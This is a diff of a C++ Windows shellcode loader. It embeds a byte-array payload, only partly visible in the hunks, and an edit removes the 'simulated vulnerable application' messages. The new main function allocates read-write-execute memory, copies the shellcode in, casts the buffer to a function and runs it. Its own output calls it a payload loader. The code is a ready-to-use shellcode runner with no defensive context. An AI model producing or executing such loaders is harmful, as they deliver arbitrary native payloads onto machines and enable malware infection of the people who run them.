@@ -2,7 +2,7 @@
 #include <cstdio>
 
 unsigned char shellcode[] = {
-  0x55, 0x57, 0x56, 0x53, 0x81, 0xec, 0x5c, 0x03, 0x00, 0x00, 0xe8, 0xc5,
+      0x55, 0x57, 0x56, 0x53, 0x81, 0xec, 0x5c, 0x03, 0x00, 0x00, 0xe8, 0xc5,
   0x06, 0x00, 0x00, 0x85, 0xc0, 0x75, 0x0b, 0x81, 0xc4, 0x5c, 0x03, 0x00,
   0x00, 0x5b, 0x5e, 0x5f, 0x5d, 0xc3, 0x89, 0xc3, 0xc7, 0x84, 0x24, 0x43,
   0x03, 0x00, 0x00, 0x4c, 0x6f, 0x61, 0x64, 0xc7, 0x84, 0x24, 0x47, 0x03,
@@ -170,21 +170,19 @@ unsigned char shellcode[] = {
 
 int main()
 {
-    printf("[*] Simulating vulnerable application...\n");
-
-    void* stack_simulation = VirtualAlloc(nullptr, 4096, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!stack_simulation) {
-        printf("[-] VirtualAlloc failed!\n");
+    void* mem = VirtualAlloc(nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!mem) {
+        printf("Memory allocation failed!\n");
         return 1;
     }
 
-    memcpy(stack_simulation, shellcode, sizeof(shellcode));
+    memcpy(mem, shellcode, sizeof(shellcode));
+    printf("Executing corrected, balanced x86 shellcode payload...\n");
 
-    printf("[*] Buffer overflow triggered. Diverting EIP to payload...\n");
+    ((void(*)())mem)();
 
-    int (*exec_payload)() = (int(*)())stack_simulation;
-    exec_payload();
+    printf("Done execution context successfully. Loader is now waiting...\n");
+    system("pause"); 
 
-    printf("[+] Execution finished.\n");
     return 0;
 }
